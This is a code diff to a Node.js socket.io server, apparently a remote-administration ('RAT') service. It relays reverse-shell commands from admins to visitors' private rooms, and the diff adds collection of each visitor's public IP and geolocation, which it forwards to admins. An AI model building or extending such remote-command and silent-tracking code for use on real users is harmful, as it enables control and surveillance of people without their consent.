@@ -55,7 +55,7 @@ function Socket(dependencies) {
         /// RAT Service Namespace
         ///
         /// 1 to 1 connection between Admin and User, this connect every users and admins in one namespace and separate with private rooms
-        function _ratServiceNamespace(ratPoolNamespaceSocket, namespace, callback) {
+        function _ratServiceNamespace(ratPoolNamespaceSocket, namespace, next) {
             if (namespace.ConnectedClients <= MAX_CLIENTS) {
                 var ratServiceNamespace;
                 // Search if namespace exist
@@ -71,7 +71,7 @@ function Socket(dependencies) {
 
                     socket.emit('Coplest.Flinger.RAT', { Command: 'ConnectedToRSN#Response', Values: { SocketId: socket.id } });
 
-                    socket.on('Coplest.Flinger.RAT', function (data, callback) {
+                    socket.on('Coplest.Flinger.RAT', function (data, next) {
                         if (data.Command != null) {
                             switch (data.Command) {
                                 case 'UserJoinToPrivateRoom#Request':
@@ -129,7 +129,7 @@ function Socket(dependencies) {
                                     ratServiceNamespace.to(data.Values.RoomId).emit('Coplest.Flinger.RAT', { Command: 'ReverseShellCommand#Request', Values: data.Values })
                                     break;
                                 case 'ValidateReverseShellCommandCSRF#Request':
-                                    callback({ IsValid: _cross.ValidateAntiForgeryToken(data.Values.csrf) });
+                                    next({ IsValid: _cross.ValidateAntiForgeryToken(data.Values.csrf) });
                                     break;
                                 default:
                                     break;
@@ -156,7 +156,7 @@ function Socket(dependencies) {
                 namespace.clients++;
             }
 
-            callback({ Command: 'RATServiceNamespace', Values: { Namespace: _siteNamespaces } });
+            next({ Command: 'RATServiceNamespace', Values: { Namespace: _siteNamespaces } });
         }
 
         /// RAT Pool Namespace
@@ -172,7 +172,7 @@ function Socket(dependencies) {
             /// Welcome to the new admin client
             socket.emit('Coplest.Flinger.RAT', { Command: 'ConnectedToRPN#Response', Values: { SocketId: socket.id.split('#')[1] } });
 
-            socket.on('Coplest.Flinger.RAT', function (data, callback) {
+            socket.on('Coplest.Flinger.RAT', function (data, next) {
                 if (data.Command != undefined) {
                     switch (data.Command) {
                         case 'CheckSiteNamespace#Request':
@@ -199,13 +199,13 @@ function Socket(dependencies) {
 
                             if (_namespace === null) {
                                 _namespace = _createNamespace(data);
-                                _ratServiceNamespace(socket, _namespace, callback);
+                                _ratServiceNamespace(socket, _namespace, next);
                             }
                             else {
-                                _ratServiceNamespace(socket, _namespace, callback);
+                                _ratServiceNamespace(socket, _namespace, next);
                             }
 
-                            //_ratServiceNamespace(data.Values.Namespace, callback);
+                            //_ratServiceNamespace(data.Values.Namespace, next);
                             break;
                         default:
                             break;
@@ -280,7 +280,7 @@ function Socket(dependencies) {
             })
 
             /// Emit a welcome message to new connection
-            socket.emit('Welcome', { Message: 'Welcome to Coplest.Flinger', SocketId: socket.id });
+            socket.emit('Welcome', { Message: 'Welcome to Crawler Site', SocketId: socket.id, PublicIP: socket.handshake.address });
 
             /// Catch when this connection is closed
             socket.on('disconnect', function () {
@@ -298,14 +298,29 @@ function Socket(dependencies) {
                 adminPoolNamespace.emit('Coplest.Flinger.RAT', { Command: 'UnsubscribeSocketToApiKey#Request', Values: { SocketId: socket.id, ApiKey: socket.ApiKey } });
             });
 
+            /* socket.on('Coplest.Flinger.IsBlocked?', function(data){
+                _database.IP().
+            }) */
+
+            //Set Api Key and geolocation to connected socket
             socket.on('Coplest.Flinger.AddApiKeyToSocket', function (data) {
                 if (data.ApiKey != undefined) {
-                    //Set Api Key to connected socket                    
-                    var connectedSocket = _io.sockets.connected[socket.id.split('#')[1]];
-                    connectedSocket.ApiKey = data.ApiKey;
-                    connectedSocket.ClientInformation = data.ClientInformation;
+                    
+                    _geolocate.Locate({ IP: socket.handshake.address }, function (geolocateResponse) {
+                        if(geolocateResponse !== undefined && geolocateResponse!== null){
+                            if(geolocateResponse.success === true){
+                                data.ClientInformation.Geolocation = geolocateResponse
+                            }
+                        }
+                        data.ClientInformation.PublicIP = socket.handshake.address;
 
-                    adminPoolNamespace.emit('Coplest.Flinger.RAT', { Command: 'SubscribeSocketToApiKey#Request', Values: { SocketId: socket.id.split('#')[1], ApiKey: data.ApiKey, ClientInformation: data.ClientInformation } });
+                        var connectedSocket = _io.sockets.connected[socket.id.split('#')[1]];
+                        connectedSocket.ApiKey = data.ApiKey;
+                        connectedSocket.ClientInformation = data.ClientInformation;
+                        
+
+                        adminPoolNamespace.emit('Coplest.Flinger.RAT', { Command: 'SubscribeSocketToApiKey#Request', Values: { SocketId: socket.id.split('#')[1], ApiKey: data.ApiKey, ClientInformation: data.ClientInformation } });
+                    });
                 }
             })
 
@@ -367,12 +382,12 @@ function Socket(dependencies) {
                             _database.Site().WebCrawling(data.Values.ApiKey, data.Values.Endpoint, function (result) {
                                 // if hasn't a screenshot
                                 if (result == false) {
-                                    _database.Screenshot().CreateScreenshot(data.Values, function (createScreenshotResult) {/*Screenshot saved*/});
+                                    _database.Screenshot().CreateScreenshot(data.Values, function (createScreenshotResult) {/*Screenshot saved*/ });
                                 }
                             });
                             break;
                         case 'GetIfLastScreenshotIsObsoleteByApiKey#Request':
-                            _database.Screenshot().GetIfLastScreenshotIsObsoleteByApiKey(data.Values, function(result){
+                            _database.Screenshot().GetIfLastScreenshotIsObsoleteByApiKey(data.Values, function (result) {
                                 socket.emit('Coplest.Flinger.ServerEvent', { Command: 'GetIfLastScreenshotIsObsoleteByApiKey#Response', Values: result });
                             })
                             break;
